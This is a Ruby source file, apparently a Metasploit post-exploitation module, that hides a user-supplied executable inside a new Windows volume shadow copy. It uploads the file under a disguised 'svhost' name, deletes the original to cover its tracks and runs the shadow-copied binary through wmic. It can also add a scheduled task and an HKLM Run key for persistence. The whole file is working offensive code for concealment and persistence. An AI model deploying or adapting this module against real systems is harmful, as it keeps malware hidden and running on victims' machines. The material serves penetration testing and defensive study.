##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/windows/shadowcopy'
require 'msf/core/post/windows/priv'
require 'msf/core/post/common'

class Metasploit4 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Common
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::ShadowCopy
  include Msf::Post::Windows::Services
  include Msf::Post::Windows::Registry

  def initialize(info={})

    super(update_info(info,
      'Name'                 => "Persistant Payload in Windows Volume Shadow Copy",
      'Description'          => %q{
        This module will attempt to create a persistant payload
        in new volume shadow copy.This is based on the VSSOwn
        Script originally posted by Tim Tomes and Mark Baggett.
        Works on win2k3 and later.
      },
      'License'              => MSF_LICENSE,
      'Platform'             => ['win'],
      'SessionTypes'         => ['meterpreter'],
      'Author'               => ['MrXors <Mr.Xors[at]gmail.com>'],
      'References'           => [
        [ 'URL', 'http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html' ],
        [ 'URL', 'http://www.irongeek.com/i.php?page=videos/hack3rcon2/tim-tomes-and-mark-baggett-lurking-in-the-shadows']
      ]
    ))

    register_options(
      [
        OptString.new('VOLUME', [ true, 'Volume to make a copy of.', 'C:\\']),
        OptBool.new('EXECUTE', [ true, 'Run the .exe on the remote system.', true]),
        OptBool.new('SCHTASK', [ true, 'Create a schtask.exe for EXE.', false]),
        OptBool.new('RUNKEY', [ true, 'Create AutoRun Key on HKLM\Software\Microsoft\Windows\CurrentVersion\Run .', false]),
        OptInt.new('DELAY', [ true, 'Delay in Minutes for Reconnect attempt.Needs SCHTASK set to true to work.default delay is 1 minute.', 1]),
        OptString.new('RPATH', [ false, 'Path on remote system to place Executable.Example \\\\Windows\\\\Temp (DO NOT USE C:\\ in your RPATH!)', ]),
        OptPath.new('PATH', [ true, 'Path to Executable on your local system.'])
      ], self.class)

  end

  def run
    path = datastore['PATH']
    @clean_up = ""

=begin
    print_status("Chceking admin")
    unless is_admin?
      print_error("This module requires admin privs to run")
      return
    end
=end

    print_status("is uac enabled")
    if is_uac_enabled?
      print_error("This module requires UAC to be bypassed first")
      return
    end

    print_status("try to start vss")
    unless start_vss
      print_error("Unable to start the Volume Shadow Service")
      return
    end

    print_status("Uploading #{path}....")
    remote_file = upload(path, datastore['RPATH'])

    print_status("Creating Shadow Volume Copy...")
    copy_id = volume_shadow_copy
    unless copy_id
      fail_with(Failure::Unknown, "Failed to create a new shadow copy")
    end

    print_status("Volume Copy Id: #{copy_id}")

    print_status("Deleting malware...")
    file_rm(remote_file)

    cmd = "cmd.exe /c vssadmin List Shadows\| find \"Shadow Copy Volume\""
    volume_data_id = []
    output = cmd_exec(cmd)

    output.each_line do |line|
      cmd_regex = /HarddiskVolumeShadowCopy\d{1,9}/.match("#{line}")
      volume_data_id = "#{cmd_regex}"
    end

    print_status("Volume Data ID: #{volume_data_id}")

    execute_executable(volume_data_id, remote_file)
    schtasks(volume_data_id, remote_file)
    regkey(@glogal_location)
    log_file
  end

  def upload(file, trgloc="")
    if trgloc == ""
      location = "\\Windows\\Temp"
    else
      location = trgloc
    end

    file_name  = "svhost#{rand(100)}.exe"
    file_on_target = "#{location}\\#{file_name}"

    begin
      upload_file("#{file_on_target}","#{file}")
    rescue ::Rex::Post::Meterpreter::RequestError => e
      fail_with(Failure::NotFound, e.message)
    end

    return file_on_target
  end

  def volume_shadow_copy
    begin
      id = create_shadowcopy(datastore['VOLUME'])
    rescue ::Rex::Post::Meterpreter::RequestError => e
      fail_with(Failure::NotFound, e.message)
    end

    if id
      return true
    else
      return false
    end
  end

  def execute_executable(volume_id, exe_path)
    @glogal_location = "\\\\?\\GLOBALROOT\\Device\\#{volume_id}\\#{exe_path}"
    if datastore["EXECUTE"]
      print_good("Running Executable!")
      run_cmd = "cmd.exe /c %SYSTEMROOT%\\system32\\wbem\\wmic.exe process call create \\\\?\\GLOBALROOT\\Device\\#{volume_id}\\#{exe_path}"
      cmd_exec(run_cmd)
    else
      return
    end
  end

  def schtasks(volume_data_id, exe_path)
    if datastore["SCHTASK"]
      sch_name = Rex::Text.rand_text_alpha(rand(8)+8)
      print_good("Creating Service..........")
      global_root = "\\\\?\\GLOBALROOT\\Device\\#{volume_data_id}\\#{exe_path}"
      sch_cmd = "cmd.exe /c %SYSTEMROOT%\\system32\\schtasks.exe /create /sc minute /mo #{datastore["DELAY"]} /tn \"#{sch_name}\" /tr #{global_root}"
      cmd_exec(sch_cmd)
      @clean_up << "execute -H -f cmd.exe -a \"/c schtasks.exe /delete /tn #{sch_name} /f\"\n"
    else
      return
    end
  end

  def regkey(path_to_exe)
    if datastore["RUNKEY"]
      nam = Rex::Text.rand_text_alpha(rand(8)+8)
      hklm_key = "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
      print_status("Installing into autorun as #{hklm_key}\\#{nam}")
      if nam
        registry_setvaldata("#{hklm_key}", nam, path_to_exe, "REG_SZ")
        print_good("Installed into autorun as #{hklm_key}\\#{nam}")
        @clean_up << "reg  deleteval -k HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run -v #{nam}\n"
      else
        print_error("Error: failed to open the registry key for writing")
      end
    else
      return
    end
  end

  def clean_data
    host = session.sys.config.sysinfo["Computer"]
    filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
    logs = ::File.join(Msf::Config.log_directory, 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
    ::FileUtils.mkdir_p(logs)
    logfile = logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + ".rc"
    return logfile
  end

  def log_file
    clean_rc = clean_data()
    file_local_write(clean_rc, @clean_up)
    print_status("Cleanup Meterpreter RC File: #{clean_rc}")
  end
end
